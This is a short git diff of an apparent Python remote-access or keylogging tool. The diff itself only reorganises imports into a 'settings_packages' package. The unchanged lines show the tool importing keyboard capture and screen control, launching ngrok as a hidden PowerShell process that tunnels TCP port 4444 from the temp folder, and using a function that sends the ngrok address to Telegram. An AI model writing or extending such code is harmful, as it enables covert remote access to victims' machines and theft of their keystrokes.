@@ -1,13 +1,13 @@
 import socket
-from pynput import mouse,keyboard
+from pynput import keyboard
 import pyautogui
 import subprocess
 import threading
-import options
+import settings_packages.options
 import signal, time
 import sys
 from rich import print
-from comand import ngrok_send_Telegram
+from settings_packages.comand import ngrok_send_Telegram
 
 # Start Process ngrok and Syncthing
 run = subprocess.run("powershell Start-Process $env:tmp\/ngrok 'tcp 4444' -WindowStyle Hidden")
@@ -24,7 +24,7 @@ def def_handler(sig, frame):
 
 signal.signal(signal.SIGINT, def_handler) 
 
-option = options
+option = settings_packages.options
 
 # Proceso Aparte Corriendo en un Hilo
 
